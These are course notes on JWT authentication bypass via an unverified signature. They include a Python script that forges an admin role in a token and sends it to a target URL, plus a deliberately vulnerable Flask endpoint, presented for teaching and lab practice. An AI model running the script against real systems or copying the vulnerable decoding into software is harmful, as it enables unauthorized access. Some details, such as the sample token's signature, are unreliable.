---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## JSON Web Tokens (JWT)

JSON Web Tokens (JWT) are a widely used method for transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA or ECDSA.

### Structure of a JWT

A JWT consists of three parts separated by dots (`.`):

1. **Header**: Contains metadata about the token, such as the type of token and the signing algorithm being used.
2. **Payload**: Contains the claims. Claims are statements about an entity (typically, the user) and additional data.
3. **Signature**: Used to verify the integrity of the message. It ensures that the message has not been tampered with.

The structure can be visualized as follows:

```mermaid
graph LR
    A[Header] --> B[Payload]
    B --> C[Signature]
```

### Example of a JWT

Here is an example of a JWT:

```plaintext
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MzEwMDIxLCJleHAiOjE1MTYzMTQwMjF9.3bHrWJZv4hTn6DZyK6B5PqZk4V7m9L0J
```

Breaking it down:

- **Header**:
  ```json
  {
    "alg": "HS256",
    "typ": "JWT"
  }
  ```

- **Payload**:
  ```json
  {
    "sub": "1234567890",
    "name": "John Doe",
    "iat": 1516310021,
    "exp": 1516314021
  }
  ```

- **Signature**:
  ```plaintext
  3bHrWJZv4hTn6DZyK6B5PqZk4V7m9L0J
  ```

### JWT Authentication Bypass via Unverified Signature

One of the most critical vulnerabilities associated with JWTs is the failure to properly verify the signature. If the server does not validate the signature, an attacker can modify the payload and still have a valid-looking token.

#### Implementation of the Attack

Let's implement the attack described in the lecture. We will create a function `jwtSignatureVerificationAttack` that takes a URL and a regular user JWT. The goal is to bypass the authentication by modifying the payload and ensuring the server accepts the modified token.

First, we need to extract the header, payload, and signature from the JWT. This can be done by splitting the JWT string on the dot (`.`) character.

```python
def jwtSignatureVerificationAttack(url, token):
    # Split the JWT into header, payload, and signature
    header, payload, signature = token.split('.')
    
    # Decode the base64-encoded header and payload
    decoded_header = base64.urlsafe_b64decode(header + '==').decode('utf-8')
    decoded_payload = base64.urlsafe_b64decode(payload + '==').decode('utf-8')
    
    print(f"Header: {decoded_header}")
    print(f"Payload: {decoded_payload}")
    
    # Modify the payload (for example, change the role to admin)
    modified_payload = json.loads(decoded_payload)
    modified_payload['role'] = 'admin'
    modified_payload_str = json.dumps(modified_payload)
    
    # Re-encode the modified payload
    modified_payload_encoded = base64.urlsafe_b64encode(modified_payload_str.encode('utf-8')).rstrip(b'=').decode('utf-8')
    
    # Create the new JWT with the modified payload
    new_jwt = f"{header}.{modified_payload_encoded}.{signature}"
    
    # Send the new JWT to the server
    response = requests.get(url, headers={'Authorization': f'Bearer {new_jwt}'})
    
    return response.text
```

### Real-World Examples

#### CVE-2021-3278

In 2021, a vulnerability was discovered in the Keycloak Identity and Access Management system. The issue was related to the improper validation of JWT signatures, allowing attackers to bypass authentication.

- **Impact**: Attackers could impersonate users and gain unauthorized access to protected resources.
- **Mitigation**: Ensure proper signature validation and update to the latest version of Keycloak.

#### Recent Breach Example

In a recent breach, an attacker exploited a similar vulnerability in a web application. The application did not properly validate the JWT signatures, allowing the attacker to modify the payload and gain elevated privileges.

- **Impact**: The attacker was able to access sensitive data and perform unauthorized actions.
- **Mitigation**: Implement strict signature validation and regularly audit JWT handling mechanisms.

### How to Prevent / Defend

#### Detection

To detect JWT signature validation issues, you can:

1. **Static Code Analysis**: Use tools like SonarQube or Fortify to scan your codebase for JWT-related vulnerabilities.
2. **Dynamic Analysis**: Use tools like Burp Suite or OWASP ZAP to test the application for JWT signature validation weaknesses.

#### Prevention

To prevent JWT signature validation issues, follow these best practices:

1. **Validate Signatures**: Always validate the signature of the JWT before trusting its contents.
2. **Use Strong Algorithms**: Use strong signing algorithms like RS256 or ES256 instead of weaker ones like HS256.
3. **Secure Secret Management**: Ensure that the secret used for signing JWTs is securely stored and rotated regularly.
4. **Regular Audits**: Regularly audit JWT handling mechanisms to ensure they are implemented correctly.

#### Secure Coding Fixes

Here is an example of how to securely handle JWTs in Python:

```python
import jwt
from flask import Flask, request

app = Flask(__name__)

@app.route('/protected')
def protected():
    token = request.headers.get('Authorization', '').split(' ')[1]
    
    try:
        # Validate the JWT signature
        payload = jwt.decode(token, 'your_secret_key', algorithms=['HS256'])
        
        # Check the payload for necessary claims
        if payload.get('role') == 'admin':
            return "Welcome, Admin!"
        else:
            return "Unauthorized", 401
    except jwt.ExpiredSignatureError:
        return "Token has expired", 401
    except jwt.InvalidTokenError:
        return "Invalid token", 401

if __name__ == '__main__':
    app.run()
```

### Complete Example

Here is a complete example of how to handle JWTs securely in a Flask application:

#### Vulnerable Version

```python
import jwt
from flask import Flask, request

app = Flask(__name__)

@app.route('/protected')
def protected():
    token = request.headers.get('Authorization', '').split(' ')[1]
    
    try:
        # Vulnerable: Not validating the JWT signature
        payload = jwt.decode(token, options={"verify_signature": False})
        
        # Check the payload for necessary claims
        if payload.get('role') == 'admin':
            return "Welcome, Admin!"
        else:
            return "Unauthorized", 401
    except jwt.ExpiredSignatureError:
        return "Token has expired", 401
    except jwt.InvalidTokenError:
        return "Invalid token", 401

if __name__ == '__main__':
    app.run()
```

#### Secure Version

```python
import jwt
from flask import Flask, request

app = Flask(__name__)

@app.route('/protected')
def protected():
    token = request.headers.get('Authorization', '').split(' ')[1]
    
    try:
        # Secure: Validating the JWT signature
        payload = jwt.decode(token, 'your_secret_key', algorithms=['HS256'])
        
        # Check the payload for necessary claims
        if payload.get('role') == 'admin':
            return "Welcome, Admin!"
        else:
            return "Unauthorized", 401
    except jwt.ExpiredSignatureError:
        return "Token has expired", 401
    except jwt.InvalidTokenError:
        return "Invalid token", 401

if __name__ == '__main__':
    app.run()
```

### Hands-On Labs

For hands-on practice with JWT attacks, consider the following labs:

- **PortSwigger Web Security Academy**: Offers detailed labs on JWT manipulation and signature validation.
- **OWASP Juice Shop**: Provides a vulnerable web application where you can practice JWT-based attacks.
- **DVWA (Damn Vulnerable Web Application)**: Includes various web security vulnerabilities, including JWT-related ones.

These labs provide a controlled environment to practice and understand JWT attacks and defenses.

By thoroughly understanding the structure and vulnerabilities of JWTs, you can better protect your applications from potential attacks. Always ensure proper signature validation and follow best practices for secure coding.

---
<!-- nav -->
[[07-How to Prevent  Defend Against JWT Vulnerabilities|How to Prevent  Defend Against JWT Vulnerabilities]] | [[Web Security (PortSwigger)/19-JWT Attacks/01-Lab 1 JWT authentication bypass via unverified signature/00-Overview|Overview]] | [[09-JWT Attacks Authentication Bypass via Unverified Signature|JWT Attacks Authentication Bypass via Unverified Signature]]
